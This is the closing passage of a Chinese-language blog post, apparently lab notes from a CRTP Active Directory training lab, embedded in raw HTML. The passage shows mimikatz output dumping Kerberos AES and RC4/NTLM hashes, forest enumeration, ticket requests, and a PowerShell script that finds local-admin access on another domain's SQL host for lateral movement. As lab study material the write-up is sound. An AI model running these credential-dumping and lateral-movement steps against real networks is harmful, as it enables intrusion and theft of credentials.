class="number">10</span> b1 <span class="number">46</span> <span class="number">1</span>a <span class="number">82</span> c1 <span class="number">2</span>e <span class="number">65</span> a7 <span class="number">48</span> <span class="number">32</span> <span class="number">59</span> d2 a4 <span class="number">8</span>d <span class="number">69</span> <span class="number">20</span> <span class="number">14</span> <span class="number">59</span> <span class="number">23</span> <span class="number">8</span>d <span class="number">99</span> <span class="number">29</span> <span class="number">96</span> <span class="number">82</span> aa c2 <span class="number">1</span>c d5 <span class="number">7</span>a <span class="number">7</span>e c2 a7 e9 a5 <span class="number">84</span> <span class="number">72</span> <span class="number">7</span>c <span class="number">60</span> <span class="number">4</span>e <span class="number">01</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">5</span>c <span class="number">85</span> <span class="number">4</span>f <span class="number">09</span> ab <span class="built_in">fc</span> ff <span class="number">79</span> <span class="number">97</span> <span class="number">44</span> <span class="number">1</span>e <span class="number">87</span> a1 <span class="number">11</span> e6 <span class="number">30</span> <span class="number">4</span>f ef <span class="number">54</span> <span class="number">70</span> a6 <span class="number">8</span>c ed a1 ae <span class="number">1</span>c a3 c8 dc <span class="number">18</span> <span class="number">82</span> e6 ea</span><br><span class="line">         * Key List :</span><br><span class="line">           aes256_hmac       <span class="number">9</span>da664ef8d6659d982234c37bb86a444a2e7477b9a40374b911d7c40d16fd104</span><br><span class="line">           rc4_hmac_nt       a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old      a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_md4           a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_nt_exp   a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line">           rc4_hmac_old_exp  a8809e48dc99d5c8afd1739ab10d0e6a</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>看到有个dbadmin用户在机器上，应该是远程过来的</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-97.png" alt="alt text"></p>
<p>枚举下eu的dc </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-Forest</span> <span class="literal">-Forest</span> eurocorp.local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RootDomainSid         : S<span class="literal">-1-5-21-3333069040-3914854601-3606488808</span></span><br><span class="line">Name                  : eurocorp.local</span><br><span class="line">Sites                 : &#123;Default<span class="literal">-First-Site-Name</span>&#125;</span><br><span class="line">Domains               : &#123;eurocorp.local, eu.eurocorp.local&#125;</span><br><span class="line">GlobalCatalogs        : &#123;eurocorp<span class="literal">-dc</span>.eurocorp.local, eu<span class="literal">-dc</span>.eu.eurocorp.local&#125;</span><br><span class="line">ApplicationPartitions : &#123;DC=ForestDnsZones,DC=eurocorp,DC=local, DC=DomainDnsZones,DC=eu,DC=eurocorp,DC=local, DC=DomainDnsZones,DC=eurocorp,DC=local&#125;</span><br><span class="line">ForestModeLevel       : <span class="number">7</span></span><br><span class="line">ForestMode            : Unknown</span><br><span class="line">RootDomain            : eurocorp.local</span><br><span class="line">Schema                : CN=Schema,CN=Configuration,DC=eurocorp,DC=local</span><br><span class="line">SchemaRoleOwner       : eurocorp<span class="literal">-dc</span>.eurocorp.local</span><br><span class="line">NamingRoleOwner       : eurocorp<span class="literal">-dc</span>.eurocorp.local</span><br></pre></td></tr></table></figure>

<p>有dc了<code>eu-dc.eu.eurocorp.local</code>，请求下tgt</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-98.png" alt="alt text"></p>
<p><img src="/wpimages/2025/crtp-lab-note/image-99.png" alt="alt text"></p>
<p>有了票据看下这个dbadmin是不是对面 <code>eu.eurocorp.local</code> 域某些机器的（虽然就一个..）的localadmin</p>
<p>加载下 <code>Find-PSRemotingLocalAdminAccess.ps1</code>（这个会自动用票据去尝试）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\Find-PSRemotingLocalAdminAccess.ps1</span><br></pre></td></tr></table></figure>

<p>然后枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-PSRemotingLocalAdminAccess -Domain EU.EUROCORP.LOCAL -verbose</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-100.png" alt="alt text"></p>
<p>就eu-sql34有localadmin，那就远程过去</p>

        
      </div>
      
         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/06/04/Tracks-AD-APT/"
      title="Tracks-AD-APT"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Tracks-AD-APT
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/04/22/box-wp-Scepter/"
      title="【season-7】 htb Scepter wp"
     >

    <p class="title-text">
      
        【season-7】 htb Scepter wp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>






    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Flower<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>


    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>


